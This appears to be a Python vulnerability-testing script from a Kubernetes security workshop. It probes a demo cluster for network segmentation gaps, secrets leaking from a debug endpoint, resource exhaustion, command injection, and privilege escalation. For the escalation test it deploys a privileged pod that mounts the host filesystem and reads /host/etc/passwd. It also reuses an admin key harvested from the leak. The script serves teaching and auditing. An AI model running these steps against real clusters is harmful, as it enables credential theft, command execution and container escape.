import requests
import json
import time
import argparse
import subprocess
import os

def print_header(text):
    print("\n" + "="*80)
    print(f" {text} ".center(80, '='))
    print("="*80 + "\n")

def print_success(text):
    print(f"✅ {text}")

def print_warning(text):
    print(f"⚠️  {text}")

def print_error(text):
    print(f"❌ {text}")

class KubernetesSecurityTester:
    def __init__(self, frontend_url, backend_url=None, admin_url=None):
        self.frontend_url = frontend_url
        self.backend_url = backend_url
        self.admin_url = admin_url
        
    def test_direct_admin_access(self):
        """
        Attack Vector 1: Demonstrate a frontend service directly accessing the admin API
        This is a network segmentation vulnerability
        """
        print_header("VULNERABILITY: NETWORK SEGMENTATION")
        print("Testing if frontend can access admin API directly (it shouldn't)...")
        
        # First try through the frontend's exposed endpoint
        print("Approach 1: Using frontend's built-in vulnerable endpoint...")
        try:
            response = requests.get(f"{self.frontend_url}/api/admin-data")
            if response.status_code == 200:
                data = response.json()
                print_success("Successfully accessed admin API through frontend!")
                print(f"Retrieved data: {json.dumps(data, indent=2)}")
                
                # Check if actually connected to admin API
                if "admin_data" in data and "message" in data:
                    print_warning("This is a CRITICAL security vulnerability:")
                    print("  - Frontend should not be able to access admin API")
                    print("  - Network policies should prevent this communication")
                    return True
            else:
                print_error(f"Failed with status {response.status_code}: {response.text}")
                return False
        except Exception as e:
            print_error(f"Error: {e}")
            return False
    
    def test_env_var_exposure(self):
        """
        Attack Vector 2: Access sensitive environment variables through debug endpoint
        This demonstrates information leakage vulnerabilities
        """
        print_header("VULNERABILITY: INFORMATION LEAKAGE")
        print("Testing if sensitive info is exposed through debug endpoints...")
        
        try:
            response = requests.get(f"{self.frontend_url}/debug")
            if response.status_code == 200:
                data = response.json()
                print_success("Successfully accessed debug endpoint!")
                
                # Check for sensitive data in environment variables
                env = data.get("environment", {})
                secrets_found = []
                
                sensitive_keywords = ["key", "password", "secret", "token", "credential"]
                for key, value in env.items():
                    for keyword in sensitive_keywords:
                        if keyword.lower() in key.lower() and value:
                            secrets_found.append(f"{key}: {value}")
                
                if secrets_found:
                    print_warning("Found exposed secrets in environment variables:")
                    for secret in secrets_found:
                        print(f"  - {secret}")
                    print("\nThis is a security vulnerability:")
                    print("  - Sensitive data should not be exposed in environment variables")
                    print("  - Debug endpoints should not be enabled in production")
                    return True
                else:
                    print("No obvious secrets found in environment variables.")
                    return False
            else:
                print_error(f"Failed to access debug endpoint: {response.status_code}")
                return False
        except Exception as e:
            print_error(f"Error: {e}")
            return False
    
    def test_resource_exhaustion(self):
        """
        Attack Vector 3: Trigger resource-intensive operations to demonstrate DoS vulnerability
        This shows why resource limits are important
        """
        print_header("VULNERABILITY: RESOURCE EXHAUSTION")
        print("Testing resource exhaustion vulnerability...")
        
        if not self.admin_url:
            print_error("Admin URL not provided, skipping test")
            return False
        
        # Try to get an admin key first from debug endpoint
        admin_key = None
        try:
            debug_response = requests.get(f"{self.frontend_url}/debug")
            if debug_response.status_code == 200:
                env = debug_response.json().get("environment", {})
                admin_key = env.get("ADMIN_KEY")
                if admin_key:
                    print_success(f"Found admin key: {admin_key}")
        except:
            pass
        
        if not admin_key:
            # Try common value from our example
            admin_key = "super-secret-key"
            print_warning(f"Using default admin key: {admin_key}")
        
        try:
            print("Triggering resource-intensive operation on admin API...")
            start_time = time.time()
            
            response = requests.get(
                f"{self.admin_url}/api/heavy-operation", 
                headers={"Authorization": f"Bearer {admin_key}"}
            )
            
            duration = time.time() - start_time
            
            if response.status_code == 200:
                print_success(f"Operation completed in {duration:.2f} seconds")
                print_warning("This operation could be used for DoS attacks:")
                print("  - No rate limiting is in place")
                print("  - No resource limits are set on containers")
                print("  - Heavy operations are not properly throttled")
                
                # Try to trigger multiple requests to demonstrate impact
                print("\nTrigger multiple requests to simulate DoS...")
                import threading
                
                def make_request():
                    try:
                        requests.get(
                            f"{self.admin_url}/api/heavy-operation", 
                            headers={"Authorization": f"Bearer {admin_key}"}
                        )
                    except:
                        pass
                
                threads = []
                for _ in range(5):
                    t = threading.Thread(target=make_request)
                    t.start()
                    threads.append(t)
                
                for t in threads:
                    t.join()
                
                print_warning("In a real cluster, this could affect other services")
                return True
            else:
                print_error(f"Failed to trigger heavy operation: {response.status_code}")
                return False
        except Exception as e:
            print_error(f"Error: {e}")
            return False
    
    def test_command_injection(self):
        """
        Attack Vector 4: Attempt to inject commands through admin API
        This demonstrates the risks of unvalidated input
        """
        print_header("VULNERABILITY: COMMAND INJECTION")
        print("Testing command injection vulnerability...")
        
        if not self.admin_url:
            print_error("Admin URL not provided, skipping test")
            return False
        
        # Try to get an admin key first
        admin_key = None
        try:
            debug_response = requests.get(f"{self.frontend_url}/debug")
            if debug_response.status_code == 200:
                env = debug_response.json().get("environment", {})
                admin_key = env.get("ADMIN_KEY")
        except:
            pass
        
        if not admin_key:
            # Try common value
            admin_key = "super-secret-key"
            print_warning(f"Using default admin key: {admin_key}")
        
        try:
            # Try a harmless command first
            test_command = "cat /etc/hostname"
            print(f"Attempting to inject command: {test_command}")
            
            payload = {
                "operation": "run_command",
                "command": test_command
            }
            
            response = requests.post(
                f"{self.admin_url}/api/system-operations",
                headers={"Authorization": f"Bearer {admin_key}"},
                json=payload
            )
            
            if response.status_code == 200:
                print_success("Command injection successful!")
                print(f"Response: {response.json()}")
                print_warning("This is a critical security vulnerability:")
                print("  - Unvalidated input can lead to command execution")
                print("  - APIs should never execute commands from user input")
                return True
            else:
                print_error(f"Command injection failed: {response.status_code}")
                return False
        except Exception as e:
            print_error(f"Error: {e}")
            return False
    
    def deploy_malicious_pod(self):
        """
        Attack Vector 5: Deploy a pod with excessive privileges to demonstrate escalation risks
        This shows why pod security contexts are important
        """
        print_header("VULNERABILITY: PRIVILEGE ESCALATION")
        print("Demonstrating privilege escalation via malicious pod...")
        
        # Create a malicious pod YAML
        malicious_pod = """
apiVersion: v1
kind: Pod
metadata:
  name: malicious-pod
spec:
  containers:
  - name: attacker
    image: ubuntu:20.04
    command: ["sleep", "3600"]
    securityContext:
      privileged: true  # This is the dangerous part
    volumeMounts:
    - name: host-filesystem
      mountPath: /host
  volumes:
  - name: host-filesystem
    hostPath:
      path: /
"""
        
        # Write to a temp file
        with open("malicious-pod.yaml", "w") as f:
            f.write(malicious_pod)
        
        print("Created malicious pod definition with:")
        print("  - Privileged mode enabled")
        print("  - Host filesystem mounted at /host")
        
        try:
            # Try to deploy the pod
            print("\nAttempting to deploy malicious pod...")
            result = subprocess.run(
                ["kubectl", "apply", "-f", "malicious-pod.yaml"],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                print_success("Successfully deployed privileged pod!")
                print_warning("This is a critical security risk:")
                print("  - Pod Security Policies/Standards should prevent this")
                print("  - Privileged containers can escape container isolation")
                
                # Show what the pod can do
                print("\nDemonstrating what this pod can do...")
                time.sleep(3)  # Wait for pod to start
                
                commands = [
                    "kubectl exec malicious-pod -- ls -la /host/etc",
                    "kubectl exec malicious-pod -- cat /host/etc/passwd",
                    "kubectl exec malicious-pod -- mount"
                ]
                
                for cmd in commands:
                    print(f"\nExecuting: {cmd}")
                    cmd_result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    if cmd_result.returncode == 0:
                        print(cmd_result.stdout[:200] + "..." if len(cmd_result.stdout) > 200 else cmd_result.stdout)
                    else:
                        print_error(f"Failed: {cmd_result.stderr}")
                
                # Clean up
                subprocess.run(["kubectl", "delete", "pod", "malicious-pod"])
                os.remove("malicious-pod.yaml")
                return True
            else:
                print_error(f"Failed to deploy pod: {result.stderr}")
                os.remove("malicious-pod.yaml")
                return False
        except Exception as e:
            print_error(f"Error: {e}")
            if os.path.exists("malicious-pod.yaml"):
                os.remove("malicious-pod.yaml")
            return False

def main():
    parser = argparse.ArgumentParser(description="Kubernetes Security Testing Tool")
    parser.add_argument("--frontend", required=True, help="Frontend service URL (e.g., http://localhost:8080)")
    parser.add_argument("--backend", help="Backend API URL (optional)")
    parser.add_argument("--admin", help="Admin API URL (optional)")
    parser.add_argument("--all", action="store_true", help="Run all tests")
    parser.add_argument("--network", action="store_true", help="Test network segmentation")
    parser.add_argument("--info", action="store_true", help="Test information leakage")
    parser.add_argument("--resource", action="store_true", help="Test resource exhaustion")
    parser.add_argument("--injection", action="store_true", help="Test command injection")
    parser.add_argument("--privilege", action="store_true", help="Test privilege escalation")
    
    args = parser.parse_args()
    
    tester = KubernetesSecurityTester(args.frontend, args.backend, args.admin)
    
    vulnerabilities_found = 0
    tests_run = 0
    
    print_header("KUBERNETES SECURITY TESTING TOOL")
    print(f"Target Frontend: {args.frontend}")
    if args.backend:
        print(f"Target Backend: {args.backend}")
    if args.admin:
        print(f"Target Admin API: {args.admin}")
    print("\nRunning selected tests...")
    
    # Network segmentation test
    if args.all or args.network:
        tests_run += 1
        if tester.test_direct_admin_access():
            vulnerabilities_found += 1
    
    # Information leakage test
    if args.all or args.info:
        tests_run += 1
        if tester.test_env_var_exposure():
            vulnerabilities_found += 1
    
    # Resource exhaustion test
    if (args.all or args.resource) and args.admin:
        tests_run += 1
        if tester.test_resource_exhaustion():
            vulnerabilities_found += 1
    
    # Command injection test
    if (args.all or args.injection) and args.admin:
        tests_run += 1
        if tester.test_command_injection():
            vulnerabilities_found += 1
    
    # Privilege escalation test
    if args.all or args.privilege:
        tests_run += 1
        if tester.deploy_malicious_pod():
            vulnerabilities_found += 1
    
    print_header("TEST SUMMARY")
    print(f"Tests run: {tests_run}")
    print(f"Vulnerabilities found: {vulnerabilities_found}")
    
    if vulnerabilities_found > 0:
        print_warning(f"\nYour Kubernetes cluster has {vulnerabilities_found} security vulnerabilities that need to be addressed!")
        print("\nRecommended fixes:")
        print("1. Implement Network Policies to restrict pod communication")
        print("2. Remove debug endpoints and sensitive environment variables")
        print("3. Set resource limits and requests for all containers")
        print("4. Implement Pod Security Standards to prevent privileged containers")
        print("5. Apply proper validation for all inputs, especially in admin interfaces")
    else:
        print_success("\nNo vulnerabilities were found in the tests that were run.")
    
    print("\nRefer to the workshop materials for detailed remediation steps.")

if __name__ == "__main__":
    main()